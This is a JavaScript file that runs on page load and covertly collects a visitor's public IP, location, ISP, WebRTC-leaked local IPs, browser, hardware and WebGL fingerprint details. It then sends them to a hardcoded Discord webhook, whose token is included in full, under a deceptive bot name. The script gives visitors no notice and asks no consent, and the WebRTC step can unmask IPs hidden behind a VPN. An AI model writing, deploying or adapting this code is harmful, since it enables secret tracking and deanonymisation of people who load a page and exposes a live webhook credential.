// Function to get IP address using a third-party service.
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unable to retrieve IP';
    }
}

// Function to get location information
async function getLocationInfo(ip) {
    if (ip === 'Unable to retrieve IP') return 'Location unavailable';

    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return `${data.city}, ${data.region}, ${data.country_name}`;
    } catch (error) {
        return 'Location unavailable';
    }
}

// Function to get ISP information
async function getISPInfo(ip) {
    if (ip === 'Unable to retrieve IP') return 'ISP unavailable';

    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return data.org || 'ISP unavailable';
    } catch (error) {
        return 'ISP unavailable';
    }
}

// Function to get connection type
function getConnectionType() {
    if ('connection' in navigator) {
        return navigator.connection.effectiveType || 'Unknown';
    }
    return 'Unknown';
}

// Function to get WebRTC IPs
function getWebRTCIPs() {
    return new Promise((resolve) => {
        const ips = [];

        // Simple WebRTC check
        const RTCPeerConnection = window.RTCPeerConnection || 
                                window.mozRTCPeerConnection || 
                                window.webkitRTCPeerConnection;

        if (!RTCPeerConnection) {
            resolve('WebRTC not supported');
            return;
        }

        try {
            const pc = new RTCPeerConnection({iceServers: []});
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));

            pc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate || !ice.candidate.candidate) {
                    resolve(ips.join(', ') || 'No IPs found');
                    return;
                }

                const candidate = ice.candidate.candidate;
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
                const match = candidate.match(ipRegex);

                if (match) {
                    const ip = match[1];
                    if (ips.indexOf(ip) === -1) ips.push(ip);
                }
            };

            // Timeout after 2 seconds
            setTimeout(() => {
                resolve(ips.join(', ') || 'No IPs found');
            }, 2000);
        } catch (error) {
            resolve('WebRTC error');
        }
    });
}

// Function to detect dark mode
function isDarkMode() {
    return window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
}

// Function to detect reduced motion preference
function hasReducedMotion() {
    return window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
}

// Main function to collect all data and send to Discord
async function collectAndSendData() {
    const ip = await getIPAddress();
    const location = await getLocationInfo(ip);
    const isp = await getISPInfo(ip);
    const webRTCIPs = await getWebRTCIPs();

    const embedData = {
        title: "🌐 User Information Collected",
        color: 0x0099ff,
        timestamp: new Date().toISOString(),
        fields: [
            {
                name: "🌍 Network Information",
                value: `**IP Address:** ${ip}\n**Location:** ${location}\n**ISP:** ${isp}\n**Connection Type:** ${getConnectionType()}\n**Online Status:** ${navigator.onLine ? 'Online' : 'Offline'}\n**WebRTC IPs:** ${webRTCIPs}`,
                inline: false
            },
            {
                name: "🖥️ System Information",
                value: `**Browser:** ${navigator.userAgent}\n**OS:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n**Vendor:** ${navigator.vendor || 'Unknown'}\n**Device Type:** ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`,
                inline: false
            },
            {
                name: "📊 Display Information",
                value: `**Screen Resolution:** ${screen.width}x${screen.height}\n**Window Size:** ${window.innerWidth}x${window.innerHeight}\n**Color Depth:** ${screen.colorDepth} bits\n**Pixel Ratio:** ${window.devicePixelRatio || 'N/A'}\n**Device Memory:** ${navigator.deviceMemory || 'Unknown'} GB`,
                inline: false
            },
            {
                name: "⚙️ Technical Capabilities",
                value: `**CPU Cores:** ${navigator.hardwareConcurrency || 'Unknown'}\n**Touch Screen:** ${'maxTouchPoints' in navigator ? navigator.maxTouchPoints > 0 : 'Unknown'}\n**Cookies Enabled:** ${navigator.cookieEnabled}\n**Local Storage:** ${!!window.localStorage}\n**Session Storage:** ${!!window.sessionStorage}`,
                inline: false
            },
            {
                name: "🔧 Web Technologies",
                value: `**Web Workers:** ${!!window.Worker}\n**Service Workers:** ${'serviceWorker' in navigator}\n**WebAssembly:** ${!!window.WebAssembly}\n**WebGL2:** ${!!document.createElement('canvas').getContext('webgl2')}\n**WebP Support:** ${(() => {
                    const canvas = document.createElement('canvas');
                    return canvas.toDataURL('image/webp').indexOf('data:image/webp') === 0;
                })()}`,
                inline: false
            },
            {
                name: "🎨 WebGL Renderer",
                value: (() => {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        return gl ? gl.getParameter(gl.RENDERER) : 'Not supported';
                    } catch (e) {
                        return 'Unable to retrieve';
                    }
                })(),
                inline: false
            },
            {
                name: "⚙️ User Preferences",
                value: `**Dark Mode:** ${isDarkMode() ? 'Enabled' : 'Disabled'}\n**Reduced Motion:** ${hasReducedMotion() ? 'Enabled' : 'Disabled'}\n**Do Not Track:** ${navigator.doNotTrack || 'Not set'}`,
                inline: false
            }
        ],
        footer: {
            text: "Data collected via JavaScript"
        }
    };

    // Send to Discord webhook
    const webhookURL = "https://discord.com/api/webhooks/1455545550995853335/FO9I7WSD4PWgwboN8IOXr6h5Uj5iIrbaA12WzcoXWbz4A3CLRy12RTcKqOwOI7Qbg_0r";

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embedData],
                username: "Internet & Technical Services Bureau",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/1006/1006771.png"
            })
        });

        if (response.ok) {
            console.log('Data sent successfully to Discord');
        } else {
            console.error('Failed to send data to Discord');
        }
    } catch (error) {
        console.error('Error sending data:', error);
    }
}

// Execute when the script is loaded
collectAndSendData();
